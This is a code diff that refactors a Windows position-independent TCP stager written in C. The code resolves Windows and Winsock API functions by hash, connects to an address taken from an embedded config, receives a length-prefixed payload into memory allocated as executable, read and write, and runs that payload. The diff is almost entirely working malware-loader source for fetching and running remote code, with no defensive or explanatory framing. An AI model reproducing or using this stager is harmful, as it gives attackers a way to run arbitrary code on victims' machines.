@@ -71,28 +71,62 @@ static int recv_all(fn_recv pRecv, pic_uintptr s, void *buf, pic_u32 count)
 	return 1;
 }
 
+struct resolved_funcs {
+	fn_VirtualAlloc pVirtualAlloc;
+	fn_ExitProcess pExitProcess;
+	fn_WSAStartup pWSAStartup;
+	fn_socket pSocket;
+	fn_connect pConnect;
+	fn_recv pRecv;
+	fn_closesocket pCloseSocket;
+};
+
+PIC_TEXT
+static int resolve_funcs(struct resolved_funcs *f)
+{
+	f->pVirtualAlloc = (fn_VirtualAlloc)pic_resolve(
+		HASH_KERNEL32_DLL, HASH_VIRTUAL_ALLOC);
+	f->pExitProcess = (fn_ExitProcess)pic_resolve(
+		HASH_KERNEL32_DLL, HASH_EXIT_PROCESS);
+	f->pWSAStartup =
+		(fn_WSAStartup)pic_resolve(HASH_WS2_32_DLL, HASH_WSA_STARTUP);
+	f->pSocket = (fn_socket)pic_resolve(HASH_WS2_32_DLL, HASH_SOCKET);
+	f->pConnect = (fn_connect)pic_resolve(HASH_WS2_32_DLL, HASH_CONNECT);
+	f->pRecv = (fn_recv)pic_resolve(HASH_WS2_32_DLL, HASH_RECV);
+	f->pCloseSocket =
+		(fn_closesocket)pic_resolve(HASH_WS2_32_DLL, HASH_CLOSESOCKET);
+	return f->pVirtualAlloc && f->pExitProcess && f->pWSAStartup &&
+		f->pSocket && f->pConnect && f->pRecv && f->pCloseSocket;
+}
+
+PIC_TEXT
+static void init_sockaddr(struct pic_sockaddr_in *sa, const pic_u8 *cfg)
+{
+	pic_u8 *sp = (pic_u8 *)sa;
+	for (int i = 0; i < (int)sizeof(*sa); i++)
+		sp[i] = 0;
+	sa->sin_family = (pic_u16)cfg[0];
+	sa->sin_port = pic_htons((pic_u16)cfg[1] | ((pic_u16)cfg[2] << 8));
+	sa->sin_addr = *(const pic_u32 *)(cfg + 3);
+}
+
+PIC_TEXT
+static pic_u32 recv_payload_size(fn_recv pRecv, pic_uintptr s)
+{
+	pic_u8 size_buf[4];
+	if (!recv_all(pRecv, s, size_buf, 4))
+		return 0;
+	return (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
+		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
+}
+
 PIC_ENTRY
 void _start(void)
 {
 	PIC_SELF_RELOCATE();
 
-	fn_VirtualAlloc pVirtualAlloc = (fn_VirtualAlloc)pic_resolve(
-		HASH_KERNEL32_DLL, HASH_VIRTUAL_ALLOC);
-	fn_ExitProcess pExitProcess = (fn_ExitProcess)pic_resolve(
-		HASH_KERNEL32_DLL, HASH_EXIT_PROCESS);
-
-	fn_WSAStartup pWSAStartup =
-		(fn_WSAStartup)pic_resolve(HASH_WS2_32_DLL, HASH_WSA_STARTUP);
-	fn_socket pSocket =
-		(fn_socket)pic_resolve(HASH_WS2_32_DLL, HASH_SOCKET);
-	fn_connect pConnect =
-		(fn_connect)pic_resolve(HASH_WS2_32_DLL, HASH_CONNECT);
-	fn_recv pRecv = (fn_recv)pic_resolve(HASH_WS2_32_DLL, HASH_RECV);
-	fn_closesocket pCloseSocket =
-		(fn_closesocket)pic_resolve(HASH_WS2_32_DLL, HASH_CLOSESOCKET);
-
-	if (!pVirtualAlloc || !pExitProcess || !pWSAStartup || !pSocket ||
-		!pConnect || !pRecv || !pCloseSocket)
+	struct resolved_funcs f;
+	if (!resolve_funcs(&f))
 		for (;;)
 			;
 
@@ -102,57 +136,44 @@ void _start(void)
 	 * smaller stack buffer.
 	 */
 	pic_u8 wsadata[408];
-	(void)pWSAStartup(0x0202, wsadata);
+	(void)f.pWSAStartup(0x0202, wsadata);
 
 	extern char stager_tcp_windows_config[]
 		__attribute__((visibility("hidden")));
 	const pic_u8 *cfg = (const pic_u8 *)stager_tcp_windows_config;
 
-	pic_uintptr s = pSocket((int)cfg[0], SOCK_STREAM, 0);
+	pic_uintptr s = f.pSocket((int)cfg[0], SOCK_STREAM, 0);
 	if (s == INVALID_SOCKET)
-		pExitProcess(1);
+		f.pExitProcess(1);
 
 	struct pic_sockaddr_in sa;
-	pic_u8 *sp = (pic_u8 *)&sa;
-	for (int i = 0; i < (int)sizeof(sa); i++)
-		sp[i] = 0;
-	sa.sin_family = (pic_u16)cfg[0];
+	init_sockaddr(&sa, cfg);
 
-	pic_u16 port_le = (pic_u16)cfg[1] | ((pic_u16)cfg[2] << 8);
-	sa.sin_port = pic_htons(port_le);
-	sa.sin_addr = *(const pic_u32 *)(cfg + 3);
-
-	if (pConnect(s, &sa, (int)sizeof(sa)) < 0) {
-		pCloseSocket(s);
-		pExitProcess(1);
+	if (f.pConnect(s, &sa, (int)sizeof(sa)) < 0) {
+		f.pCloseSocket(s);
+		f.pExitProcess(1);
 	}
 
-	pic_u8 size_buf[4];
-	if (!recv_all(pRecv, s, size_buf, 4)) {
-		pCloseSocket(s);
-		pExitProcess(1);
-	}
-	pic_u32 size = (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
-		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
+	pic_u32 size = recv_payload_size(f.pRecv, s);
 	if (size == 0 || size > 0x10000000) {
-		pCloseSocket(s);
-		pExitProcess(1);
+		f.pCloseSocket(s);
+		f.pExitProcess(1);
 	}
 
-	void *mem = pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
+	void *mem = f.pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
 		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!mem) {
-		pCloseSocket(s);
-		pExitProcess(1);
+		f.pCloseSocket(s);
+		f.pExitProcess(1);
 	}
 
-	if (!recv_all(pRecv, s, mem, size)) {
-		pCloseSocket(s);
-		pExitProcess(1);
+	if (!recv_all(f.pRecv, s, mem, size)) {
+		f.pCloseSocket(s);
+		f.pExitProcess(1);
 	}
-	pCloseSocket(s);
+	f.pCloseSocket(s);
 
 	((void (*)(void))mem)();
 
-	pExitProcess(0);
+	f.pExitProcess(0);
 }
